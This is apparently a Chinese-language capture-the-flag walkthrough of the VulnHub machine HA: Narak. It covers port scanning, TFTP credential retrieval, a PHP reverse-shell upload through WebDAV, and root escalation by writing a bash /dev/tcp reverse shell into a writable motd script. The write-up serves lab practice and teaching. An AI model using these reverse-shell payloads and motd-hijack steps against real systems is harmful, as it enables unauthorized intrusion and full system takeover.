# Ha:Narak主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/ha-narak,569/
- 下载地址：https://download.vulnhub.com/ha/narak.ova



## 信息收集：

### 主机发现：

- 使用`netdiscover -i eth1 `来进行扫描主机网段，`-i` 指定网卡名称，本机IP地址：`192.168.2.2` 

- ```shell
   Currently scanning: 172.26.163.0/16   |   Screen View: Unique Hosts         
   
   15 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 900            
   _____________________________________________________________________________
     IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
   -----------------------------------------------------------------------------
   192.168.2.1     00:50:56:c0:00:01      5     300  VMware, Inc.              
   192.168.2.5     00:0c:29:24:c2:9a      8     480  VMware, Inc.              
   192.168.2.254   00:50:56:e4:fb:db      2     120  VMware, Inc. 
  ```



### 端口扫描

- tcp扫描

- ```SHELL
  └─$ sudo nmap --min-rate 10000 -sT 192.168.2.5 -p- -oA Nmap-scan/sT  
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 04:39 EDT
  Nmap scan report for 192.168.2.5
  Host is up (0.0025s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 00:0C:29:24:C2:9A (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 16.86 seconds
  ```

- udp扫描

- ```SHELL
  └─$ sudo nmap --min-rate 10000 -sU 192.168.2.5 -p- -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 04:40 EDT
  Warning: 192.168.2.5 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.5
  Host is up (0.0013s latency).
  All 65535 scanned ports on 192.168.2.5 are in ignored states.
  Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  MAC Address: 00:0C:29:24:C2:9A (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.47 seconds
  
  ```



### 服务端口及操作系统探测

- ```shell
  └─$ sudo nmap --min-rate 10000 -sC -sV -O -p22,80 192.168.2.5 -oA Nmap-scan/sC    
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 04:48 EDT
  Nmap scan report for 192.168.2.5
  Host is up (0.00045s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 (RSA)
  |   256 f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 (ECDSA)
  |_  256 d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: HA: NARAK
  MAC Address: 00:0C:29:24:C2:9A (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
  OS details: Linux 3.2 - 4.9
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds
  
  ```



### 默认漏洞脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80 192.168.2.5 -oA Nmap-scan/Script    
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 05:19 EDT
  Stats: 0:00:12 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
  Parallel DNS resolution of 1 host. Timing: About 0.00% done
  Nmap scan report for 192.168.2.5
  Host is up (0.00035s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  | http-internal-ip-disclosure: 
  |_  Internal IP Leaked: 127.0.1.1
  | http-csrf: 
  | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.5
  |   Found the following possible CSRF vulnerabilities: 
  |     
  |     Path: http://192.168.2.5:80/
  |     Form id: 
  |_    Form action: images/666.jpg
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  | http-enum: 
  |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |_  /webdav/: Potentially interesting folder (401 Unauthorized)
  MAC Address: 00:0C:29:24:C2:9A (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 38.40 seconds
  ```

- 



### web扫描

```shell
└─$ gobuster dir -u http://192.168.2.5/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x rar,zip,sql,txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.5/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              rar,zip,sql,txt
[+] Timeout:                 10s
===============================================================
2023/08/13 05:20:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://192.168.2.5/images/]
/tips.txt             (Status: 200) [Size: 58]
/webdav               (Status: 401) [Size: 458]
/server-status        (Status: 403) [Size: 276]
Progress: 1100309 / 1102805 (99.77%)
===============================================================
2023/08/13 05:23:03 Finished
===============================================================
```

- 查看`tips`文件内容 -> **`Hint to open the door of narak can be found in creds.txt.`**
- 尝试在地址栏访问该文件，无法找到该文件。



### udp端口二次扫描

```shell
└─$ sudo nmap --min-rate 10000 -sU 192.168.2.5 --top-port 20 -oA Nmap-scan/sU
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 23:34 EDT
Nmap scan report for 192.168.2.5
Host is up (0.00029s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
MAC Address: 00:0C:29:24:C2:9A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds

```

- 尝试使用tftp收集信息

### tftp

使用`get creds.txt`将文件下载到本地，查看内容，发现使用base64进行加密，解密后的字符串为：`yamdoot:Swarg`

```shell
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Ha:Narak]
└─$ tftp 192.168.2.5   
tftp> get creds.txt
tftp>                                                                                                        
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Ha:Narak]
└─$ cat creds.txt                              
eWFtZG9vdDpTd2FyZw==
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Ha:Narak]
└─$ cat creds.txt | base64 -d
yamdoot:Swarg                                                                                                       
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Ha:Narak]
└─$ 

```

- 尝试使用`root`&&`yamdoot`用户来登录系统均以失败。
- 使用当前账号密码可以登录到之前扫描的`webdav`中，尝试上传反弹shell



## 获取反弹shell

使用`davtest`来进行检测当前`tftp`系统做的设置

```shell
└─$ davtest -url http://192.168.2.5/webdav -auth yamdoot:Swarg
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.2.5/webdav
********************************************************
NOTE    Random string for this session: yRdEwA
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.2.5/webdav/DavTestDir_yRdEwA
********************************************************
 Sending test files
PUT     cgi     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cgi
PUT     asp     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.asp
PUT     jsp     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jsp
PUT     cfm     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cfm
PUT     txt     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.txt
PUT     shtml   SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.shtml
PUT     aspx    SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.aspx
PUT     pl      SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.pl
PUT     html    SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.html
PUT     jhtml   SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jhtml
PUT     php     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.php
********************************************************
 Checking for test file execution
EXEC    cgi     FAIL
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.txt
EXEC    txt     FAIL
EXEC    shtml   FAIL
EXEC    aspx    FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    php     SUCCEED:        http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.php
EXEC    php     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://192.168.2.5/webdav/DavTestDir_yRdEwA
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cgi
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.asp
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jsp
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cfm
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.txt
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.shtml
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.aspx
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.pl
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.html
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jhtml
PUT File: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.php
Executes: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.txt
Executes: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.html
Executes: http://192.168.2.5/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.php

```

- 当前环境可以支持上传并执行`php`文件
- ps:不知道什么原因，使用`tftp `自带的`put`上传文件总是超时。

### 使用cadaver进行上传反弹shell

- `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1'"); ?>`

- ```shell
  └─$ cadaver http://192.168.2.5/webdav
  Authentication required for webdav on server `192.168.2.5':
  Username: yamdoot
  Password: 
  dav:/webdav/> ls
  Listing collection `/webdav/': succeeded.
  Coll:   DavTestDir_yRdEwA                      0  Aug 17 22:45
  dav:/webdav/> put ./shell.php
  Uploading ./shell.php to `/webdav/shell.php':
  Progress: [=============================>] 100.0% of 75 bytes succeeded.
  dav:/webdav/> 
  
  ```

- 开启监听并接收反弹shell--> 成功获取反弹shell

- ```shell
  └─$ nc -nvlp 1234 
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.5] 58462
  bash: cannot set terminal process group (571): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ubuntu:/var/www/webdav$ whoami
  whoami
  www-data
  www-data@ubuntu:/var/www/webdav$ id
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  www-data@ubuntu:/var/www/webdav$ uname -a
  uname -a
  Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  www-data@ubuntu:/var/www/webdav$ ip a   
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:24:c2:9a brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.5/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1048sec preferred_lft 1048sec
      inet6 fe80::20c:29ff:fe24:c29a/64 scope link 
         valid_lft forever preferred_lft forever
  www-data@ubuntu:/var/www/webdav$ 
  ```

#### 获取用户的flag

- ```shell
  www-data@ubuntu:/home/inferno$ cd /home
  cd /home
  www-data@ubuntu:/home$ ls -lhai
  ls -lhai
  total 20K
  1048577 drwxr-xr-x  5 root    root    4.0K Sep 22  2020 .
        2 drwxr-xr-x 22 root    root    4.0K Sep 21  2020 ..
  1062644 drwxr-xr-x  2 inferno inferno 4.0K Sep 22  2020 inferno
  1053673 drwxr-xr-x  3 narak   narak   4.0K Sep 21  2020 narak
  1062585 drwxr-xr-x  2 yamdoot yamdoot 4.0K Sep 21  2020 yamdoot
  www-data@ubuntu:/home$ cd inferno
  cd inferno
  www-data@ubuntu:/home/inferno$ ls -lhai
  ls -lhai
  total 24K
  1062644 drwxr-xr-x 2 inferno inferno 4.0K Sep 22  2020 .
  1048577 drwxr-xr-x 5 root    root    4.0K Sep 22  2020 ..
  1062646 -rw-r--r-- 1 inferno inferno  220 Sep 22  2020 .bash_logout
  1062647 -rw-r--r-- 1 inferno inferno 3.7K Sep 22  2020 .bashrc
  1062648 -rw-r--r-- 1 inferno inferno  807 Sep 22  2020 .profile
  1062650 -rw-r--r-- 1 root    root      41 Sep 22  2020 user.txt
  www-data@ubuntu:/home/inferno$ cat user.txt
  cat user.txt
  Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}
  www-data@ubuntu:/home/inferno$ 
  ```

## 提权：

- 当前用户权限较低，查找系统中当前用户可写文件--> `find / -writable -type f 2>/dev/null -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null` 

- ```shell
  www-data@ubuntu:/home/inferno$ find / -writable -type f 2>/dev/null -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
  /proc/*" -not -path "/sys/*" 2>/dev/nullt -path "/
  /mnt/hell.sh
  /etc/update-motd.d/91-release-upgrade
  /etc/update-motd.d/00-header
  /etc/update-motd.d/50-motd-news
  /etc/update-motd.d/80-esm
  /etc/update-motd.d/80-livepatch
  /etc/update-motd.d/10-help-text
  /etc/apache2/users.password
  /var/www/.bash_history
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.html
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.php
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.asp
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.shtml
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.pl
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.aspx
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jsp
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cfm
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.txt
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.jhtml
  /var/www/webdav/DavTestDir_yRdEwA/davtest_yRdEwA.cgi
  /var/www/webdav/shell.php
  /var/www/html/index.html
  /var/www/html/style.css
  /var/www/html/images/9.jpg
  /var/www/html/images/10.jpg
  /var/www/html/images/7.jpg
  /var/www/html/images/666.jpg
  /var/www/html/images/13.jpg
  /var/www/html/images/3.jpg
  /var/www/html/images/19.jpg
  /var/www/html/images/4.jpg
  /var/www/html/images/14.jpg
  /var/www/html/images/16.jpg
  /var/www/html/images/5.jpg
  /var/www/html/images/12.jpg
  /var/www/html/images/18.jpg
  /var/www/html/images/15.jpg
  /var/www/html/images/8.jpg
  /var/www/html/images/6.jpg
  /var/www/html/images/1.jpg
  /var/www/html/images/2.jpg
  /var/www/html/images/11.jpg
  /var/www/html/images/17.jpg
  /var/www/html/font.css
  /var/www/DavLock
  www-data@ubuntu:/home/inferno$ 
  
  ```

- 查看`/mnt/hell.sh`文件内容

- ```shell
  www-data@ubuntu:/mnt$ cat hell.sh
  cat hell.sh
  #!/bin/bash
  
  echo"Highway to Hell";
  --[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
  
  ```

- 通过在线工具网站进行解密[`brainfuck`](https://www.splitbrain.org/services/ook)字符串-->得到字符串：`chitragupt`，或者使用`beef`解释器来进行解析。

  - ```shell
    └─$ echo "--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
    " > hell.bf | beef hell.bf
    chitragupt  
    ```

- 尝试使用ssh进行登录，由于上一步中获取到的`user.txt`文件存在于`inferno`用户下，猜测可能是其密码

- ```shell
  └─$ ssh inferno@192.168.2.5                                                   
  inferno@192.168.2.5's password: 
  Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  
   * Canonical Livepatch is available for installation.
     - Reduce system reboots and improve kernel security. Activate at:
       https://ubuntu.com/livepatch
  
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
  
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
  
  inferno@ubuntu:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:24:c2:9a brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.5/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1318sec preferred_lft 1318sec
      inet6 fe80::20c:29ff:fe24:c29a/64 scope link 
         valid_lft forever preferred_lft forever
  inferno@ubuntu:~$ id
  uid=1002(inferno) gid=1002(inferno) groups=1002(inferno)
  inferno@ubuntu:~$ uname -a
  Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  inferno@ubuntu:~$ 
  ```

- 利用`00-header`进行提权-->该文件用于显示用户在登录系统时候执行的操作：`bash -c "bash -i >& /dev/tcp/192.168.2.2/1234 0>&1"`

- ![image-20230818120851408](https://raw.githubusercontent.com/r0o983/images/main/202308181208525.png)

### 成功取得root权限

```shell
└─$ nc -nvlp 1234  
listening on [any] 1234 ...
connect to [192.168.2.2] from (UNKNOWN) [192.168.2.5] 59986
bash: cannot set terminal process group (33655): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/# whoami
whoami
root
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/# uname -a
uname -a
Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
root@ubuntu:/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:24:c2:9a brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.5/24 brd 192.168.2.255 scope global dynamic ens33
       valid_lft 1339sec preferred_lft 1339sec
    inet6 fe80::20c:29ff:fe24:c29a/64 scope link 
       valid_lft forever preferred_lft forever
root@ubuntu:/# cd /root 
cd /root
root@ubuntu:/root# ls -lhai
ls -lhai
total 24K
1048579 drwx------  3 root root 4.0K Sep 21  2020 .
      2 drwxr-xr-x 22 root root 4.0K Sep 21  2020 ..
1048580 -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
1062589 drwxr-xr-x  3 root root 4.0K Sep 21  2020 .local
1048581 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
1062645 -rw-r--r--  1 root root 4.0K Sep 21  2020 root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████
                           
                                                                                    
Root Flag: {9440aee508b6215995219c58c8ba4b45}

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/hackinarticles

Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
__________________________________

root@ubuntu:/root# 

```



